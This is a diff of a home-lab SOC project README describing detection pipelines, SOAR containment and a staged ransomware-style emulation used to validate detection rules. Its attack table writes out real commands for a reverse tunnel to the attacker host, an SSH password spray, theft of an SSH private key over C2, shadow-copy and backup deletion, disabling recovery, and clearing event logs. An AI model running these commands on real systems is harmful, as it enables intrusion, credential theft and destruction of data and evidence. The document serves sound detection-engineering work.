@@ -26,7 +26,7 @@ Everything runs locally on a single hypervisor host. All attack simulations targ
 | 5 — Network IDS + DNS detection | Suricata on pfSense + Suricata→Wazuh pipeline, DNS tunneling + behavioral C2 beaconing | ✅ Implemented |
 | 6-A — SOAR pipeline | Wazuh → n8n integration, high-severity alert triage and routing | ✅ Implemented |
 | 6-B — Automated response | Host isolation via pfSense REST API + allowlist + circuit breaker + investigation tickets | ✅ Implemented |
-| 6-C — Case management + enrichment | TheHive 5 (BerkeleyDB + Lucene) + Cortex (9 analyzers), ATT&CK-classified tickets, phishing triage pipeline | ✅ Implemented |
+| 6-C — Case management + enrichment | TheHive 5 (BerkeleyDB + Lucene) + Cortex (8 analyzers wired across two pipelines), ATT&CK-classified tickets, phishing triage pipeline | ✅ Implemented |
 | 7 — Adversary emulation (GentleKiller kill-chain) | Full-lifecycle intrusion emulated stage by stage — see sub-phases below | ✅ Implemented |
 | ↳ 7-A — Initial Access | Edge exploitation: CVE-2024-55591 (FortiOS auth-bypass) URI signature; nmap + Nuclei recon — Suricata rules | ✅ Implemented |
 | ↳ 7-B — Fileless Execution → C2 | In-memory Sliver beacon via PowerShell reflective loader (no disk write); LOLBin outbound + beaconing confirm | ✅ Implemented |
@@ -46,10 +46,10 @@ pfSense sits in-path as the gateway, so all routed traffic passes through it —
 
 | VM | OS | RAM | Role | IP |
 | --- | --- | --- | --- | --- |
-| `siem` | Ubuntu Server 22.04 | 7 GB | Wazuh Manager + Indexer + Dashboard (Docker Compose) | 10.10.10.10 |
-| `win-ep` | Windows 10 | 2 GB | Endpoint: Sysmon + ASR + Wazuh agent | 10.10.10.20 |
-| `pfSense` | pfSense 2.7.2 | 2 GB | In-path gateway + Suricata 7.0.8 IDS | 10.10.10.1 |
-| Host | Windows + VirtualBox | 16 GB | Hypervisor | 10.10.10.2 |
+| `siem` | Ubuntu Server 22.04 | 5.9 GB | Wazuh Manager + Indexer + Dashboard, TheHive 5, Cortex + Elasticsearch, n8n (all Docker Compose) | 10.10.10.10 |
+| `win-ep` | Windows 10 | 2 GB | Endpoint: Sysmon (sysmon-modular) + ASR + Wazuh agent — powered on for attack validation | 10.10.10.20 |
+| `pfSense` | pfSense 2.7.2 | 1.5 GB | In-path gateway + Suricata 7.0.8 IDS + REST API (SOAR containment) | 10.10.10.1 |
+| Host | Windows 11 + VirtualBox | 16 GB | Hypervisor — and the attacker platform (Sliver C2, Ligolo-ng, nmap, Nuclei), architecturally external to the LAN | 10.10.10.2 |
 
 Network: LAN `10.10.10.0/24`, pfSense in-path (WAN via NAT), default-deny egress.
 
@@ -107,14 +107,14 @@ Each stage is driven by real red-team tooling from the attacker host (ThinkPad, 
 | 7-E Lateral Movement | Ligolo-ng 0.8.2 | proxy on attacker (Administrator + `wintun.dll` beside the exe): `.\proxy.exe -selfcert`; agent on victim via the beacon: `agent.exe -connect 10.10.10.2:11601 -ignore-cert -retry`; then `session` → `tunnel_start --tun ligolo` and `New-NetRoute -DestinationPrefix 10.10.10.0/24 -InterfaceIndex <ligolo> -RouteMetric 1` (T1572) | — tunnelling: proven by the SIEM logging the SSH source as **win-ep (10.10.10.20)**, not the attacker |
 | 7-E Lateral Movement | ssh (OpenSSH 9.5) **over the Ligolo tunnel** | credential spray to trip detection: loop `ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no svc-backup@10.10.10.10` — carried by the tunnel above, so it exits from win-ep, not the attacker (T1110) | **5763** — sshd brute-force ticket, level 10, source correctly attributed to win-ep |
 | 7-E Lateral Movement | Sliver C2 `download` + ssh (OpenSSH 9.5) **over the Ligolo tunnel** | steal the SSH key over the encrypted C2 channel (`download ...id_ed25519`, CRLF→LF fix), then authenticate through the tunnel: `ssh -i stolen_key svc-backup@10.10.10.10` — valid-account access; the SIEM sees the source as win-ep, not the attacker (T1552.004 + T1021.004 + T1078) | **100210** (L12) → SOAR cross-host correlation → **Critical** lateral-movement ticket; the earlier "gap" was rule 5715 firing at level 3 (a classification gap, not a collection one) |
-
 | 7-F Impact | PowerShell (controlled encryptor) | staged sequence on a throwaway directory, each step spawned as its own process so Sysmon records the real command line: `Get-WmiObject Win32_Volume` → `vssadmin delete shadows /all /quiet` → `wmic shadowcopy delete` → `net stop VSS` → XOR-rewrite + rename to `.umc16h` + `README-GENTLEMEN.txt` → `wevtutil cl Application` (T1082/T1490/T1489/T1486/T1070.001) | 100400 / 100401 / 100402 / 100403 / 100405 / 100406 / 100407 / 100408 → **Critical** impact ticket |
-| 7-F Impact | Microsoft Defender (defender-side result) | with real-time protection left ON for the first run, Defender terminated the PowerShell process mid-encryption on **behaviour**, not signature — `Behavior:Win32/GenShadowCopy!rsm`, severity 5 | — L1 prevention proven: the design doc's "enable, don't build" layer stopping the chain in practice |
 | 7-F Impact | Atomic Red Team (T1490 series) | independent second tool, run with real-time protection disabled to measure detection rather than prevention: `wbadmin delete catalog`, `bcdedit /set {default} recoveryenabled no`, `Win32_Shadowcopy` deletion via PowerShell WMI, `schtasks /Change /TN \Microsoft\Windows\SystemRestore\SR /disable`, `SystemRestore` registry `DisableSR`, `vssadmin resize shadowstorage` | 100409 / 100410 / 100412 / 100413 / 100414 / 100415 — **seven recovery-destruction paths the first pass had missed** |
 
 **Why the persistence command is the differentiator:** Sliver's `registry write` uses the Windows Registry API from inside the implant, so Sysmon EID 13 records `image=powershell.exe`, not `reg.exe`. Wazuh's built-in Run-key rules are all bound to `image=reg.exe` and go silent; the custom rule inherits from `92300`/`92302` and fires on *what* is persisted, catching the write regardless of writer.
 
 **Why the impact stage was run twice, with two different tools:** the controlled encryptor proves the *sequence* — enumerate, destroy recovery, encrypt, clear logs — but it only exercises the paths its author already thought of. Replaying the same technique through Atomic Red Team's independent implementations invoked six binaries the first pass never touched, and every one of them went undetected. The rules that closed those gaps (100409–100415) exist only because a second tool was used; a detection validated by the tool that motivated it is validated against itself.
+
+**The defender-side result:** real-time protection was left ON for the first run on purpose. Microsoft Defender terminated the PowerShell process mid-encryption on **behaviour**, not signature — `Behavior:Win32/GenShadowCopy!rsm`, severity 5 — against a script written that same session, which no signature could have covered. That is the design's L1 prevention layer working, and it is the reason the Atomic replay was run with protection disabled instead: detection coverage and prevention are two different measurements, and each needs its own conditions.
 
 ### The DNS behavioral C2 detection (Phase 5)
 
@@ -183,7 +183,23 @@ The allowlist and circuit breaker are enforced both as visible n8n nodes and in 
 
 Every alert also produces a professional, TheHive-ready **investigation ticket**: ticket key, priority with an SLA, TLP, MITRE technique, detection details, TheHive-style observables, an event timeline, the automated action taken, enrichment placeholders (for Cortex — VirusTotal / AbuseIPDB), a seven-step L1 investigation checklist, and a disposition field (True Positive / False Positive / Escalated). This gives an analyst a realistic case to triage, mirroring what lands in a real SOC queue.
 
-The whole pipeline was validated end to end with a **real multi-stage APT attack chain** on the endpoint (discovery -> credential access -> persistence -> defense evasion -> C2): 15 detection rules fired across 13 MITRE techniques and 6 tactics, and the DNS C2 detection automatically isolated the endpoint on the firewall — no manual step. Automated containment via the firewall's native API is exactly the pattern an enterprise would implement (with PAN-OS / FortiOS APIs in place of the open-source package).
+The whole pipeline was validated end to end with a **real multi-stage APT attack chain** on the endpoint (discovery -> credential access -> persistence -> defense evasion -> C2): 15 detection rules fired across 13 MITRE techniques and 6 tactics, and the DNS C2 detection drove the containment path automatically with no manual step. Automated containment via the firewall's native API is exactly the pattern an enterprise would implement (with PAN-OS / FortiOS APIs in place of the open-source package).
+
+**Containment is reported honestly, and currently reads NOT APPLIED.** The API call succeeds and the source IP lands in the `soar_blocklist` alias, but no firewall rule consumes that alias yet, so traffic is not actually dropped. The ticket says so in plain words rather than claiming an isolation the SOAR has not achieved — a ticket that reports false containment is worse than one that reports none, because the analyst stops responding. A single flag flips it once a LAN block rule sources the alias.
+
+### Enrichment, correlation, and ATT&CK-classified tickets (Phase 6-C)
+
+The workflow grew from a triage-and-block path into a classifier. Fifteen nodes now sit between the webhook and TheHive:
+
+**Enrichment runs on every alert, independent of containment.** An alert that cannot be blocked - one on protected infrastructure - needs *more* analysis, not less. Observables are deduplicated, routed by capability so each type only reaches analyzers that are decisive for it, run with bounded parallelism (3 concurrent analyzer containers, to fit the RAM budget), and rolled up into one verdict. A correctness rule matters here: an analyzer's per-field *colour* is not a verdict, so an informational metric like a domain's resolution count stays visible as context without being read as malicious.
+
+**Two correlation nodes turn pairs of alerts into one finding.** The rule engine cannot do this - `if_matched_*` is built for repetition of the same event, not for chaining events of different kinds. The BYOVD node ties a kernel driver load to a security-tooling kill on the same host inside a window; the lateral-movement node is cross-host, matching an unexpected SIEM login against a recent high-severity alert from the *source* of that login. In both cases the pair is the finding, and neither half would justify a Critical alone.
+
+**The ticket classifies rather than transcribes.** It maps the alert's technique to an ATT&CK tactic, derives severity from three inputs (Wazuh level, tactic weight, threat-intel verdict), and selects an investigation plan built for that tactic - an LSASS dump arrives with dump-specific tasks, a C2 alert with beaconing tasks, an Impact alert with "isolate before investigating" at the top and a `do-not-reboot` label. A technique can override its tactic's plan where the generic one does not fit: process injection under Defense Evasion gets memory-and-parent tasks instead of "restore the control", and log clearing under Impact points the analyst at the off-host SIEM copy the local wipe cannot reach. Containment state shapes the plan too - an alert on protected infrastructure that cannot be auto-contained leads with an escalation step.
+
+**Deduplication keeps the queue usable.** A beacon emits an event roughly every 70 seconds; thirteen identical Critical tickets an hour is alert fatigue, not detection. Identical detections inside a 15-minute window resolve to the same ticket key, which doubles as TheHive's `sourceRef`, so the duplicate is rejected and the open ticket stands. Correlated chains get their own key space - without that, the chain ticket would collide with the plain single-rule ticket already opened in the same window and the most important ticket would be lost silently.
+
+A second pipeline handles **phishing**: a user-reported `.eml` from an IMAP mailbox is parsed, its observables routed through Cortex, and scored on signals that need no prior reputation - brand-lookalike domains (homoglyph normalisation + edit distance), display-name mismatches, SPF/DKIM/DMARC results, anchor-text deception, credential-capture paths, and lure language. On a test sample where every reputation source returned clean (VirusTotal 0/91, URLhaus no results), scoring still reached high risk on seven independent signals - which is the point, because targeted phishing uses domains too new to have any reputation.
 
 ## Key design decisions
 
@@ -258,16 +274,24 @@ homelab-mdr/
 │   └── scripts/                         # 6-B containment
 │       ├── soar-block.py                # host-isolation blocker (allowlist + circuit breaker)
 │       └── cron-dns-pipeline            # cron: pull && analyze, every minute
-└── docs/
-    ├── architecture.svg / architecture.png
-    └── evidence/                        # screenshots per phase
+├── docs/
+│   ├── architecture.svg / architecture.png
+│   ├── phase7-attack-scenario.md        # Phase 7 design doc: threat profile, stage plan, rule sources
+│   ├── phase-progress.md                # phase-by-phase completion tracker
+│   ├── phase5-session2-pipeline.md      # Suricata -> Wazuh pipeline build notes
+│   ├── phase5-stream-stability-pull-model.md  # why the collector pulls instead of pushes
+│   ├── known-issues/                    # documented defects (agent 4.9.0 syscollector crash)
+│   └── evidence/                        # screenshots per phase
+└── testing/                             # per-technique test cases with evidence
+    ├── README.md
+    └── T001-T1059.001-obfuscated-powershell.md
 ```
 
 ---
 
 ## Roadmap
 
-- **Phase 6 — SOAR (implemented):** 6-A wired Wazuh → n8n triage; 6-B added automated host isolation via the pfSense REST API — gated by an infrastructure allowlist and a circuit breaker — plus professional investigation tickets, validated with a real multi-stage attack chain; 6-C deployed **TheHive 5** (BerkeleyDB + Lucene — no Cassandra, RAM-conscious) as the case-management front end where both ticket streams land, and **Cortex** (9 analyzers: VirusTotal / AbuseIPDB / URLhaus / Pulsedive / GoogleDNS / EmailRep / EmlParser / Abuse_Finder / Urlscan) for enrichment. The ticket builder is an **ATT&CK classifier** — it derives priority, investigation tasks and playbook from the alert's tactic. An **automated phishing-triage pipeline** (n8n → EmlParser → routed Cortex analyzers → reputation-independent signal scoring → TheHive case) mirrors the #1 ticket type an L1 analyst triages.
+- **Phase 6 — SOAR (implemented):** 6-A wired Wazuh → n8n triage; 6-B added automated host isolation via the pfSense REST API — gated by an infrastructure allowlist and a circuit breaker — plus professional investigation tickets, validated with a real multi-stage attack chain; 6-C deployed **TheHive 5** (BerkeleyDB + Lucene — no Cassandra, RAM-conscious) as the case-management front end where both ticket streams land, and **Cortex** for enrichment — eight analyzers wired across the two pipelines: VirusTotal, AbuseIPDB, URLhaus, Pulsedive and GoogleDNS on the alert path; EmlParser, EmailRep and Urlscan added on the phishing path. Routing is capability-based, so each observable type only reaches the analyzers that are decisive for it. The ticket builder is an **ATT&CK classifier** — it derives priority, investigation tasks and playbook from the alert's tactic. An **automated phishing-triage pipeline** (n8n → EmlParser → routed Cortex analyzers → reputation-independent signal scoring → TheHive case) mirrors the #1 ticket type an L1 analyst triages.
   - *Planned enhancements:* block-TTL auto-unblock (read-modify-write on the alias), DNS-level domain/subdomain blocking (Unbound / pfBlockerNG NXDOMAIN, post-enrichment), and a reputation-independent signal scorer for network tickets (mirroring the phishing scorer).
 - **Phase 7 — Adversary emulation (GentleKiller kill-chain) — implemented:** rather than a single ransomware payload, Phase 7 reconstructs the *full intrusion lifecycle* of The Gentlemen / GentleKiller — the #2 RaaS of 2026 (ESET, June 2026) — as an eight-stage attack chain, each stage emulated with professional tooling and validated attack → detection → SOAR → TheHive. **7-A** initial access (CVE-2024-55591 auth-bypass at the edge), **7-B** fileless in-memory execution → C2, **7-C** persistence (writer-agnostic ASEP), **7-D** BYOVD EDR-killer with the driver-load↔kill **correlation**, **7-E** lateral movement (SSH key stolen over the Sliver C2 channel → Ligolo-ng tunnel → valid-account login to the SIEM, correlated cross-host into one Critical ticket), and **7-F** impact — volume enumeration, recovery-capability destruction, mass encryption and event-log clearing. Two original layers the real victims lacked round it out: **L4**, a resilient "surviving channel" that tells a killed agent apart from a powered-off host (endpoint-silence + off-host network-alive), and **L0**, a SIEM self-health monitor that catches the detection engine dying silently. The design centers on *behavioral* detection — the strongest signal against an actor that swaps eight BYOVD driver variants and writes its tooling in Go. Tooling: **Sliver C2** (in-memory implant, C2, key theft over the encrypted channel), **Ligolo-ng** (userland-TUN tunnelling — the pivot that let the external attacker reach the SIEM through the compromised endpoint), **Nuclei** (edge probing), a **controlled PowerShell encryptor** on a throwaway directory for the impact sequence, and **Atomic Red Team** (T1490 series) as an independent second tool — running the same technique through different binaries exposed seven recovery-destruction paths the first pass had missed. Full design: `docs/phase7-attack-scenario.md`.
 
